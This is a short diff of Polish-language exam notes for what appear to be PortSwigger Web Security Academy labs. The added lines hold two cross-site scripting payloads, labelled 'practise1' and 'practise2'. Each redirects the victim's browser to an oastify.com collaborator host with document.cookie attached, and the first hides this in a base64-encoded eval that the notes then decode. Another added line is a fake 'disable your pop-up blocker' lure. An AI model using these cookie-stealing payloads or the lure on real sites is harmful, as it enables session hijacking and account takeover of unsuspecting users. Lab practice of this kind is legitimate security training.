@@ -1,7 +1,7 @@
 KAMERA
 DOWÓD
 ZAPISZ PROJECT W BURP
-cc
+The latest version of Google Chrome - please disable your pop-up blocker.
 
 
 stage 1:
@@ -15,7 +15,20 @@ Cel: zdobyć ciasteczka - info do notatnika:
 Cel: delivery exploit
 payloady z testów próbnych:
 
+practise1:
+<script>
+location = "https://0a9e000d047376a4804a128f00690043.web-security-academy.net/?SearchTerm=\"-eval(atob('bG9jYXRpb249J2h0dHBzOi8vamQwY2Q0d2pxZGNrZ2FqOTFzeTloZ3k1M3c5bnhmbDQub2FzdGlmeS5jb20vP2M9Jytkb2N1bWVudC5jb29raWU='))-\"";
+</script>
 
-II
+w base64 jest:
+location='https://jd0cd4wjqdckgaj91sy9hgy53w9nxfl4.oastify.com/?c='+document.cookie
+
+
+practise2:
+<script>
+location ="https://0a9500ee0416e1f48486a7230088004a.web-security-academy.net/?
+find=%22};%20location=%22https://n8w2f9euhi8b4hrh4s7oevklwc23qwel.oastify.com/?%22%2bdocument.cookie;%20//":
+</script>
+
 
 
